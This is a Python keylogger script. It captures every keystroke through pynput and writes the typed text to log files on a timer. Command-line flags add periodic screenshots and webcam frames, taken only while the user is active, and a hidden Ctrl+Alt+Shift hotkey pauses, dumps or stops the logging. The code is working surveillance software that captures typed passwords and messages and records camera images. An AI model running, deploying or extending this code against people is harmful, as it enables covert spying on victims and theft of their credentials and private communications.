import sys
from log import logger, screenshot
from pynput import keyboard, mouse
from pynput.keyboard import Key, Listener, KeyCode
from countdown import Countdown
from util import utilities
from log import camcapture
from decorators.decorators import catch_exception

S_code = 83
P_code = 80
D_code = 68
T_code = 84

is_ctrl_pressed:bool = False
is_alt_pressed:bool = False
is_shift_pressed:bool = False
is_not_paused:bool = True
should_capture_screenshots:bool = False
should_capture_webcam:bool = False
screenshot_interval:int = 3
webcam_capture_interval:int = 17
is_keyboard_idle:bool = True
is_mouse_idle:bool = True
key_buffer:list[str] = list()
buffer_capacity:int = 500
elements_to_preserve:int = 20


@catch_exception(print_trace=True)
def on_pressed(key):
    global key_buffer, is_alt_pressed, is_shift_pressed, is_ctrl_pressed, is_keyboard_idle
    if isinstance(key, KeyCode):
        if is_ctrl_pressed or is_alt_pressed:
            __check_for_special_handling(ord(key.char))
        else:
            is_keyboard_idle = False
            if is_not_paused:
                key_buffer.append(key.char)
    else:
        if __check_for_combination_key(key):
            return

        if is_not_paused:
            if key == Key.space:
                is_keyboard_idle = False
                key_buffer.append(" ")
            elif key == Key.backspace:
                if len(key_buffer) > 0:
                    del key_buffer[-1]
            elif key == Key.enter:
                is_keyboard_idle = False
                key_buffer.append("\n")

    if len(key_buffer) == buffer_capacity:
        __log_buffer()


def on_release(key):
    if key == Key.ctrl_l:
        global is_ctrl_pressed
        is_ctrl_pressed = False
    elif key == Key.alt_l:
        global is_alt_pressed
        is_alt_pressed = False
    elif key == Key.shift_l:
        global is_shift_pressed
        is_shift_pressed = False


def on_click(x,y,button,pressed):
    global is_mouse_idle
    is_mouse_idle = False


def __check_for_combination_key(key) -> bool:
    global is_ctrl_pressed, is_alt_pressed, is_shift_pressed

    if key == Key.ctrl_l:
        is_ctrl_pressed = True
        return True
    elif key == Key.alt_l:
        is_alt_pressed = True
        return True
    elif key == Key.shift_l:
        is_shift_pressed = True
        return True

    return False


def __check_for_special_handling(unicode):
    if is_alt_pressed and is_shift_pressed and is_ctrl_pressed:
        global is_not_paused,key_buffer

        if   unicode == P_code:     #stop recording and timers
            is_not_paused = False
        elif unicode == S_code:     #start recording and timers again
            is_not_paused = True
        elif unicode == D_code:     #force dump contents of array in file
            __log_buffer(is_dump=True)
        elif unicode == T_code:     #wait for log to complete if ongoing, and exit
            __exit_safely()


def __log_buffer(is_dump:bool=False):
    global key_buffer, elements_to_preserve
    if is_dump:
        logger.log_to_file(buffer=key_buffer, is_dump=is_dump)
        key_buffer = list()
    else:
        new_buffer = key_buffer[len(key_buffer)-elements_to_preserve:]
        logger.log_to_file(buffer=key_buffer,elements_to_skip=elements_to_preserve)
        key_buffer = new_buffer


def __check_for_new_characters():
    global is_keyboard_idle
    if is_not_paused:
        if not is_keyboard_idle or len(key_buffer) == 0:
            is_keyboard_idle = True
            return

        __log_buffer(is_dump=True)


def __take_screenshot():
    if is_not_paused:
        if not is_keyboard_idle or not is_mouse_idle:
            screenshot.take_screenshot()


def __make_cam_capture():
    if is_not_paused:
        if not is_keyboard_idle or not is_mouse_idle:
            camcapture.capture_cam_frame()


def __make_mouse_idle():
    global is_mouse_idle
    is_mouse_idle = True


def __exit_safely():
    m_listener.stop()
    k_listener.stop()
    logger.shutdown()
    Countdown.stop_all()
    logger.queue_callback(__exit_immediately)


def __exit_immediately(*args):
    exit(0)


def __init_executors():
    logger.init()
    Countdown.make_and_start("backup logs", 25 * 60, __check_for_new_characters)
    if should_capture_screenshots:
        Countdown.make_and_start("screenshots", screenshot_interval * 60, __take_screenshot)
    if should_capture_webcam:
        Countdown.make_and_start("cam capture", webcam_capture_interval * 60, __make_cam_capture)
    if should_capture_screenshots or should_capture_webcam:
        Countdown.make_and_start("mouse idle", 7.3 * 60, __make_mouse_idle)


def __read_program_args():
    global should_capture_screenshots, should_capture_webcam, webcam_capture_interval, screenshot_interval
    if len(sys.argv) > 1:
        count = 1
        while count < len(sys.argv):
            if sys.argv[count] == '-s':
                count += 1
                should_capture_screenshots = True
                if count < len(sys.argv):
                    intval = utilities.as_int(sys.argv[count])
                    if intval is None: continue
                    screenshot_interval = 1 if intval < 1 else intval
            elif sys.argv[count] == '-w':
                count += 1
                should_capture_webcam = True
                if count < len(sys.argv):
                    intval = utilities.as_int(sys.argv[count])
                    if intval is None: continue
                    webcam_capture_interval = 1 if intval < 1 else intval
            count += 1



# ________________________________________ START _________________________________________________

__read_program_args()
__init_executors()

with keyboard.Listener(on_press=on_pressed, on_release=on_release) as k_listener, \
     mouse.Listener(on_click=on_click) as m_listener:
    m_listener.join()
    k_listener.join()


